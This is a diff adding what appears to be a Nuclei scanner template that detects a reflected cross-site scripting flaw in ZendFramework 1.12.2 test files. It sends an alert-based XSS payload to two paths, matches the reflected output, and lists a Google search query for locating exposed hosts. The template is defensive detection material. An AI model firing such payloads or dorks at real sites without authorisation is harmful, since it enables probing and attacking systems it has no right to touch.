@@ -1,0 +1,40 @@
+id: zend-v1-xss
+
+info:
+  name: ZendFramework 1.12.2 - Cross-Site Scripting
+  author: c3l3si4n
+  severity: medium
+  description: |
+    ZendFramework of versions <=1.12.2 contain a cross-site scripting vulnerability via an arbitrarily supplied parameter.
+  reference:
+    - https://twitter.com/c3l3si4n/status/1600035722148212737
+  metadata:
+    verified: true
+    google-query: inurl:"/tests/Zend/Http/"
+  tags: zend,zendframework,xss
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vendor/diablomedia/zendframework1-http/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(1)>"
+      - "{{BaseURL}}/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)>"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"redirection"]'
+          - '"param"'
+          - '<img/src=x onerror=alert(document.domain)'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
